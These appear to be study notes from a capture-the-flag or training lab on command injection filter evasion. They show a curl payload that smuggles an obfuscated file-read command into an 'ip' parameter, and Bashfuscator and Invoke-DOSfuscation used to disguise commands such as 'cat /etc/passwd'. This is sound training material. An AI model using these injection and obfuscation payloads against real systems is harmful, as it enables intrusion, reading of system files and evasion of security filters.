#

`%0a` == SPACE char

```
curl -X POST "http://94.237.49.212:41131/" --data 'ip=;{$(rev<<<"tac"),${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt}'
```

> Note that we are using <<< to avoid using a pipe |, which is a filtered character.


# Bashfuscator - Linux

https://github.com/Bashfuscator/Bashfuscator

We can start by simply providing the command we want to obfuscate with the -c flag:  
`./bashfuscator -c 'cat /etc/passwd'`


we can use some of the flags from the help menu to produce a shorter and simpler obfuscated command, as follows:  
`./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1`

# DOSfuscation - Windows

```
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS C:\htb> cd Invoke-DOSfuscation
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
Invoke-DOSfuscation> help

HELP MENU :: Available options shown below:
[*]  Tutorial of how to use this tool             TUTORIAL
...SNIP...

Choose one of the below options:
[*] BINARY      Obfuscated binary syntax for cmd.exe & powershell.exe
[*] ENCODING    Environment variable encoding
[*] PAYLOAD     Obfuscated payload via DOSfuscation
```

```
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1

...SNIP...
Result:
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```
